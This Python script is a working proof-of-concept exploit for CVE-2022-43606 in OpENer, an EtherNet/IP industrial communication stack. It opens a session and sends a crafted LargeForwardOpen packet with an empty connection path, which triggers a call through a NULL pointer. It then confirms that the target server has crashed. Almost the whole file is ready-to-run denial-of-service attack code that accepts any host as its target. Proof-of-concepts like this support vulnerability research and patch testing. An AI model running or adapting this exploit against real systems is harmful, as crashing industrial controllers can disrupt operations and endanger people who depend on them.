#!/usr/bin/env python3
"""
PoC for OpENer CVE-2022-43606 (TALOS-2022-1663) - LargeForwardOpen null call.

A LargeForwardOpen (service 0x5B to Connection Manager class 0x06) with
connection_path_size = 0 (no connection path) is parsed as a Non-Null /
Non-Matching ForwardOpen. HandleNonNullNonMatchingForwardOpenRequest()
(source/src/cip/cipconnectionmanager.c) then calls
GetConnectionManagementEntry(class_id==0), which returns a non-NULL but
uninitialized slot whose open_connection_function pointer is NULL, and invokes
it unchecked -> call through NULL -> SIGSEGV (jump to pc 0x0).

  1. RegisterSession
  2. SendRRData -> LargeForwardOpen, connection_path_size = 0
"""
import socket
import struct
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 44818

ENCAP_HDR = struct.Struct("<HHIIQI")


def encap(cmd, session, payload=b""):
    return ENCAP_HDR.pack(cmd, len(payload), session, 0, 0, 0) + payload


def register_session(s):
    s.sendall(encap(0x0065, 0, struct.pack("<HH", 1, 0)))
    resp = s.recv(4096)
    if len(resp) < 24:
        raise RuntimeError("short RegisterSession response")
    return struct.unpack_from("<I", resp, 4)[0]


def build_large_forward_open(connection_path=b""):
    body = b""
    body += struct.pack("<BB", 0x03, 0xFA)            # priority/tick, timeout ticks
    body += struct.pack("<II", 0x11111111, 0x22222222)  # O->T, T->O connection ids
    body += struct.pack("<HH", 0x1234, 0x00FE)        # connection serial, vendor id
    body += struct.pack("<I", 0x00000001)             # originator serial
    body += struct.pack("<B", 1)                      # timeout multiplier
    body += b"\x00\x00\x00"                            # 3 reserved bytes
    body += struct.pack("<I", 1000000)                # O->T RPI
    body += struct.pack("<I", 0x42000002)             # O->T net params (large=DWORD), non-null
    body += struct.pack("<I", 1000000)                # T->O RPI
    body += struct.pack("<I", 0x42000002)             # T->O net params (large), non-null
    body += struct.pack("<B", 0xA3)                   # transport class trigger
    body += struct.pack("<B", len(connection_path) // 2)  # connection_path_size = 0
    body += connection_path
    epath = bytes([0x20, 0x06, 0x24, 0x01])           # Connection Manager class 0x06, inst 1
    return bytes([0x5B, len(epath) // 2]) + epath + body


def build_send_rr_data(cip_request):
    cpf = struct.pack("<IH", 0, 0)                       # interface handle UDINT + timeout UINT
    cpf += struct.pack("<H", 2)                          # item count
    cpf += struct.pack("<HH", 0x0000, 0)                 # null address item
    cpf += struct.pack("<HH", 0x00B2, len(cip_request))  # unconnected data item
    cpf += cip_request
    return cpf


def main():
    s = socket.create_connection((HOST, PORT), timeout=5)
    session = register_session(s)
    print(f"[*] RegisterSession OK, session=0x{session:08x}")

    payload = build_send_rr_data(build_large_forward_open(b""))
    s.sendall(encap(0x006F, session, payload))
    print(f"[*] Sent LargeForwardOpen, connection_path_size=0 ({len(payload)} bytes CPF)")

    try:
        data = s.recv(4096)
        print(f"[*] Server replied {len(data)} bytes (no crash yet)")
    except (socket.timeout, ConnectionResetError, OSError) as e:
        print(f"[+] Connection dropped/reset ({e}) - server likely crashed")

    time.sleep(0.5)
    try:
        s2 = socket.create_connection((HOST, PORT), timeout=2)
        s2.close()
        print("[-] Server still accepting connections")
    except OSError:
        print("[+] Server no longer accepting connections - CRASH confirmed")


if __name__ == "__main__":
    main()
